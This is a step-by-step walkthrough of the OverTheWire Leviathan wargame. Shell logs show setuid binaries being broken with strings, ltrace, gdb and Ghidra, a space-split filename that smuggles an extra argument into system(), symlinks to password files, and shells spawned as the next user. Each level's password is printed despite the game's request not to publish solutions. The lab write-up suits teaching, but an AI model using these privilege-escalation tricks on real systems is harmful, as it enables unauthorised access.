# Leviathan
SSH Information
```
Host: leviathan.labs.overthewire.org
Port: 2223
```

Dare you face the lord of the oceans?
Leviathan is a wargame that has been rescued from the demise of intruded.net, previously hosted on leviathan.intruded.net. Big thanks to adc, morla and reth for their help in resurrecting this game!

What follows below is the original description of leviathan, copied from intruded.net:

Summary:
Difficulty:     1/10
Levels:         8
Platform:   Linux/x86

Author:
Anders Tonfeldt

Special Thanks:
We would like to thank AstroMonk for coming up with a replacement idea for the last level,
deadfood for finding a leveljump and Coi for finding a non-planned vulnerability.

Description:
This wargame doesn't require any knowledge about programming - just a bit of common
sense and some knowledge about basic \*nix commands. We had no idea that it'd be this
hard to make an interesting wargame that wouldn't require programming abilities from 
the players. Hopefully we made an interesting challenge for the new ones.
Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on leviathan.labs.overthewire.org through SSH on port 2223.

To login to the first level use:
```
Username: leviathan0
Password: leviathan0
```
Data for the levels can be found in the homedirectories. You can look at /etc/leviathan\_pass for the various level passwords.

## Level 0
```
Username: leviathan0
Password: leviathan0
```

In the homedirectory is a ./.backup folder, which contains a bookmarks.html. Let's check out if there is a password included for the next room.
```
leviathan0@gibson:~$ ls -al
total 24
drwxr-xr-x  3 root       root       4096 Feb 21 22:02 .
drwxr-xr-x 83 root       root       4096 Feb 21 22:03 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Feb 21 22:02 .backup
-rw-r--r--  1 root       root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root       3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root       root        807 Jan  6  2022 .profile
leviathan0@gibson:~$ ls -al .backup/
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Feb 21 22:02 .
drwxr-xr-x 3 root       root         4096 Feb 21 22:02 ..
-rw-r----- 1 leviathan1 leviathan0 133259 Feb 21 22:02 bookmarks.html
leviathan0@gibson:~$
leviathan0@gibson:~$ cat .backup/bookmarks.html | grep -i leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
leviathan0@gibson:~$
```

## Level 1
```
Username: leviathan1
Password: PPIfmI1qsA
```

We can find a runnable file ./check. It has set the SUID bit for the user leviathan2. If we run the program, we have to input a password.
```
leviathan1@gibson:~$ ls -al
total 36
drwxr-xr-x  2 root       root        4096 Feb 21 22:02 .
drwxr-xr-x 83 root       root        4096 Feb 21 22:03 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan2 leviathan1 15072 Feb 21 22:02 check
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan1@gibson:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805, for GNU/Linux 3.2.0, not stripped
leviathan1@gibson:~$ ./check
password: password
Wrong password, Good Bye ...
leviathan1@gibson:~$
```

So we gave to give a correct password to get further. Taking a look into the binary with strings at the part were the output 'password' is written:
```
leviathan1@gibson:~$ strings check | less
[...]
secrf
love
password:
/bin/sh
Wrong password, Good Bye ...
;*2$"0
GCC: (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0
crt1.o
```
The program probably runs a shell if the password is correct. Since the SUID for the user leviathan2 is set, we should get a shell as this user.

Trying 'love' or 'secrf' will not give us access. We could download and decompile or debug it, but let's also take a look with a hex viewer like hexdump. Close to the tested words, we can find the following:
```
leviathan1@gibson:~$ hexdump -C check | less
[...]
00001200  f4 31 c0 c7 45 e0 73 65  78 00 c7 45 ed 73 65 63  |.1..E.sex..E.sec|
00001210  72 66 c7 45 f1 65 74 c6  45 f3 00 c7 45 e4 67 6f  |rf.E.et.E...E.go|
00001220  64 00 c7 45 e8 6c 6f 76  65 c6 45 ec 00 83 ec 0c  |d..E.love.E.....|
```

So trying the word 'sex' as password seems to be correct and gives us our password for the next level:
```
leviathan1@gibson:~$ ./check
password: sex
$ id
uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)
$ cat /etc/leviathan_pass/leviathan2
mEh5PNl10e
$
```

The easier way could be to check the execution of binary with ltrace. Here we can see the password directly:
```
leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80491e6, 1, 0xffffd5f4, 0 <unfinished ...>
printf("password: ")                                                                             = 10
getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: password
)                                              = 112
getchar(0xf7fbe4a0, 0xf7fd6f70, 0x786573, 0x646f67)                                              = 97
getchar(0xf7fbe4a0, 0xf7fd6170, 0x786573, 0x646f67)                                              = 115
strcmp("pas", "sex")                                                                             = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                             = 29
+++ exited (status 0) +++
```

## Level 2
```
Username: leviathan2
Password: mEh5PNl10e
```

The binary ./printfile tries to print out a given file via cat, as we can see later. But it seems like there is another checking mechanism, if we can print out the file or not.
```
leviathan2@gibson:~$ ls -al
total 36
drwxr-xr-x  2 root       root        4096 Feb 21 22:02 .
drwxr-xr-x 83 root       root        4096 Feb 21 22:03 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Feb 21 22:02 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan2@gibson:~$ file printfile
printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=32c7e041842883e05808ab99c763a0fc1849b84e, for GNU/Linux 3.2.0, not stripped
leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
leviathan2@gibson:~$
```

My first approach here was to debug via gdb an jump over the check. It worked but I learned here the following: "You can only debug a setuid or setgid program if the debugger is running as root. The kernel won't let you call ptrace on a program running with extra privileges." (https://unix.stackexchange.com/questions/15911/can-gdb-debug-suid-root-programs)

So you can skip the checking, but the program isn't runned with the SUID rights.

Let's check the program with ltrace:
```
leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x80491e6, 2, 0xffffd5d4, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                      = -1
puts("You cant have that file..."You cant have that file...
)                                                               = 27
+++ exited (status 1) +++
leviathan2@gibson:~$
leviathan2@gibson:~$ mkdir /tmp/dir
leviathan2@gibson:~$ cd /tmp/dir
leviathan2@gibson:/tmp/dir$ touch test
leviathan2@gibson:/tmp/dir$ ltrace ~/printfile test
__libc_start_main(0x80491e6, 2, 0xffffd5b4, 0 <unfinished ...>
access("test", 4)                                                                                = 0
snprintf("/bin/cat test", 511, "/bin/cat %s", "test")                                            = 13
geteuid()                                                                                        = 12002
geteuid()                                                                                        = 12002
setreuid(12002, 12002)                                                                           = 0
system("/bin/cat test" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                           = 0
+++ exited (status 0) +++
leviathan2@gibson:/tmp/dir$
```

The program is building a command string with cat and executes it. We can do the following to trick this execution:
```
leviathan2@gibson:/tmp/dir$ touch "test test"
leviathan2@gibson:/tmp/dir$ ls -al
total 504
drwxrwxr-x    2 leviathan2 leviathan2   4096 Apr  4 15:51 .
drwxrwx-wt 3420 root       root       507904 Apr  4 15:51 ..
-rw-rw-r--    1 leviathan2 leviathan2      0 Apr  4 15:51 test test
leviathan2@gibson:/tmp/dir$ ltrace ~/printfile "test test"
__libc_start_main(0x80491e6, 2, 0xffffd5a4, 0 <unfinished ...>
access("test test", 4)                                                                           = 0
snprintf("/bin/cat test test", 511, "/bin/cat %s", "test test")                                  = 18
geteuid()                                                                                        = 12002
geteuid()                                                                                        = 12002
setreuid(12002, 12002)                                                                           = 0
system("/bin/cat test test"/bin/cat: test: No such file or directory
/bin/cat: test: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                           = 256
+++ exited (status 0) +++
leviathan2@gibson:/tmp/dir$ ~/printfile "test test"
/bin/cat: test: No such file or directory
/bin/cat: test: No such file or directory
leviathan2@gibson:/tmp/dir$ ln -s /etc/leviathan_pass/leviathan3 test
leviathan2@gibson:/tmp/dir$ ls -al
total 504
drwxrwxr-x    2 leviathan2 leviathan2   4096 Apr  4 15:52 .
drwxrwx-wt 3420 root       root       507904 Apr  4 15:52 ..
lrwxrwxrwx    1 leviathan2 leviathan2     30 Apr  4 15:52 test -> /etc/leviathan_pass/leviathan3
-rw-rw-r--    1 leviathan2 leviathan2      0 Apr  4 15:51 test test
leviathan2@gibson:/tmp/dir$ ~/printfile "test test"
Q0G8j4sakn
Q0G8j4sakn
leviathan2@gibson:/tmp/dir$ ~/printfile test
You cant have that file...
leviathan2@gibson:/tmp/dir$
```

cat can print several files, seperated by a space. But the check via access() will check the full filename with the space. So we pass this check and cat out the file afterwards.

## Level 3
```
Username: leviathan3
Password: Q0G8j4sakn
```

Again we have a binary that checks for a password and starts a shell afterwards. We can easily solve it again with ltrace:
```
leviathan3@gibson:~$ ls -al
total 40
drwxr-xr-x  2 root       root        4096 Feb 21 22:02 .
drwxr-xr-x 83 root       root        4096 Feb 21 22:03 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan4 leviathan3 18072 Feb 21 22:02 level3
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan3@gibson:~$ ./level3
Enter the password> pass
bzzzzzzzzap. WRONG
leviathan3@gibson:~$ ltrace ./level3
__libc_start_main(0x80492bf, 1, 0xffffd5f4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                       = -1
printf("Enter the password> ")                                                                   = 20
fgets(Enter the password> pass
"pass\n", 256, 0xf7fab620)                                                                 = 0xffffd3cc
strcmp("pass\n", "snlprintf\n")                                                                  = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                       = 19
+++ exited (status 0) +++
leviathan3@gibson:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ id
uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)
$ cat /etc/leviathan_pass/leviathan4
AgvropI4OA
$
```

## Level 4
```
Username: leviathan4
Password: AgvropI4OA
```

You find a .trash directory with a binary named 'bin'. Executing this will print some binary numbers. Checking the program with ltrace shows, that the password for the next level is read.
```
leviathan4@gibson:~$ ls -al
total 24
drwxr-xr-x  3 root root       4096 Feb 21 22:02 .
drwxr-xr-x 83 root root       4096 Feb 21 22:03 ..
-rw-r--r--  1 root root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root root       3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root root        807 Jan  6  2022 .profile
dr-xr-x---  2 root leviathan4 4096 Feb 21 22:02 .trash
leviathan4@gibson:~$ ls -al .trash/
total 24
dr-xr-x--- 2 root       leviathan4  4096 Feb 21 22:02 .
drwxr-xr-x 3 root       root        4096 Feb 21 22:02 ..
-r-sr-x--- 1 leviathan5 leviathan4 14928 Feb 21 22:02 bin
leviathan4@gibson:~$ cd .trash/
leviathan4@gibson:~/.trash$ ls -al
total 24
dr-xr-x--- 2 root       leviathan4  4096 Feb 21 22:02 .
drwxr-xr-x 3 root       root        4096 Feb 21 22:02 ..
-r-sr-x--- 1 leviathan5 leviathan4 14928 Feb 21 22:02 bin
leviathan4@gibson:~/.trash$ file bin
bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=27f52c687c97c02841058c6b6ae07efe97f23226, for GNU/Linux 3.2.0, not stripped
leviathan4@gibson:~/.trash$ ./bin
01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010
leviathan4@gibson:~/.trash$ ltrace ./bin
__libc_start_main(0x80491a6, 1, 0xffffd5e4, 0 <unfinished ...>
fopen("/etc/leviathan_pass/leviathan5", "r")                                                     = 0
+++ exited (status 255) +++
leviathan4@gibson:~/.trash$
```

Throwing the binary string into CyberChef will show the string 'EKKlTF1Xqs'. This is our next password.

## Level 5
```
Username: leviathan5
Password: EKKlTF1Xqs
```

The given binary 'leviathan5' tries to open the file /tmp/file.log and read out the content. After that it deletes the file:
```
leviathan5@gibson:~$ ls -al
total 36
drwxr-xr-x  2 root       root        4096 Feb 21 22:02 .
drwxr-xr-x 83 root       root        4096 Feb 21 22:03 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 15132 Feb 21 22:02 leviathan5
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan5@gibson:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5
__libc_start_main(0x8049206, 1, 0xffffd5f4, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                      = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@gibson:~$ touch /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5
__libc_start_main(0x8049206, 1, 0xffffd5f4, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                      = 0x804d1a0
fgetc(0x804d1a0)                                                                                 = '\377'
feof(0x804d1a0)                                                                                  = 1
fclose(0x804d1a0)                                                                                = 0
getuid()                                                                                         = 12005
setuid(12005)                                                                                    = 0
unlink("/tmp/file.log")                                                                          = 0
+++ exited (status 0) +++
leviathan5@gibson:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@gibson:~$ touch /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
leviathan5@gibson:~$ ls -al /tmp/file.log
ls: cannot access '/tmp/file.log': No such file or directory
leviathan5@gibson:~$ echo "hallo" > /tmp/file.log
leviathan5@gibson:~$ cat /tmp/file.log
hallo
leviathan5@gibson:~$ ./leviathan5
hallo
leviathan5@gibson:~$ ls -al /tmp/file.log
ls: cannot access '/tmp/file.log': No such file or directory
leviathan5@gibson:~$
```

To get our password, we can just create a symlink named /tmp/file.log to the password file of the next level:
```
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ls -al /tmp/file.log
lrwxrwxrwx 1 leviathan5 leviathan5 30 Apr  4 22:42 /tmp/file.log -> /etc/leviathan_pass/leviathan6
leviathan5@gibson:~$ ./leviathan5
YZ55XPVk2l
leviathan5@gibson:~$
```

## Level 6
```
Username: leviathan6
Password: YZ55XPVk2l
```

In this level we have a binary that takes a 4 digit code. If it is correct we get the console with the user of the next level:
```
leviathan6@gibson:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@gibson:~$ ./leviathan6 1111
Wrong
leviathan6@gibson:~$
```

With ltrace, strace or hexdump we don't get any hint for the digit code, that we need to enter. So i downloaded the file and quickliy reversed it with Ghidra. Here we can the if condition:
```c
  iVar1 = atoi((char *)param_2[1]);
  if (iVar1 == 0x1bd3) {
    __euid = geteuid();
    __ruid = geteuid();
    setreuid(__ruid,__euid);
    system("/bin/sh");
  }
  else {
    puts("Wrong");
  }
```

The programm is checking for the input 0x1bd3 or in decimal 7123. Entering this number will give us the access to read the next password:
```
leviathan6@gibson:~$ ./leviathan6 7123
$ id
uid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)
$ cat /etc/leviathan_pass/leviathan7
8GpZ5f8Hze
$
```

Otherwise we can also debug the program with gdb and find the hex value in the stack at the moment of the compare:
```
(gdb) b *0x0804922a
Breakpoint 3 at 0x804922a
(gdb) run 1111
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/leviathan6/leviathan6 1111
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080491e5 in main ()
(gdb) c
Continuing.

Breakpoint 3, 0x0804922a in main ()
(gdb) disass
Dump of assembler code for function main:
[...]
   0x0804921c <+70>:    mov    eax,DWORD PTR [eax]
   0x0804921e <+72>:    sub    esp,0xc
   0x08049221 <+75>:    push   eax
   0x08049222 <+76>:    call   0x80490b0 <atoi@plt>
   0x08049227 <+81>:    add    esp,0x10
=> 0x0804922a <+84>:    cmp    DWORD PTR [ebp-0xc],eax
   0x0804922d <+87>:    jne    0x804925a <main+132>
   0x0804922f <+89>:    call   0x8049060 <geteuid@plt>
   0x08049234 <+94>:    mov    ebx,eax
[...]
   0x08049274 <+158>:   pop    ebp
   0x08049275 <+159>:   lea    esp,[ecx-0x4]
   0x08049278 <+162>:   ret
End of assembler dump.
(gdb) x/10x $sp
0xffffd4c0:     0xffffd500      0xf7fbe66c      0xf7fbeb10      0x00001bd3
0xffffd4d0:     0xffffd4f0      0xf7fab000      0xf7ffd020      0xf7da2519
0xffffd4e0:     0xffffd6fe      0x00000070
(gdb) x/d $ebp-0xc
0xffffd4cc:     7123
(gdb)
```

Of course you can also just brute force the digit code. Pretty simple would be a for loop from 0000 to 9999.

## Level 7
```
Username: leviathan7
Password: 8GpZ5f8Hze
```

Challenge done:
```
leviathan7@gibson:~$ ls -al
total 24
drwxr-xr-x  2 root       root       4096 Feb 21 22:02 .
drwxr-xr-x 83 root       root       4096 Feb 21 22:03 ..
-rw-r--r--  1 root       root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root       3771 Jan  6  2022 .bashrc
-r--r-----  1 leviathan7 leviathan7  178 Feb 21 22:02 CONGRATULATIONS
-rw-r--r--  1 root       root        807 Jan  6  2022 .profile
leviathan7@gibson:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
leviathan7@gibson:~$
```
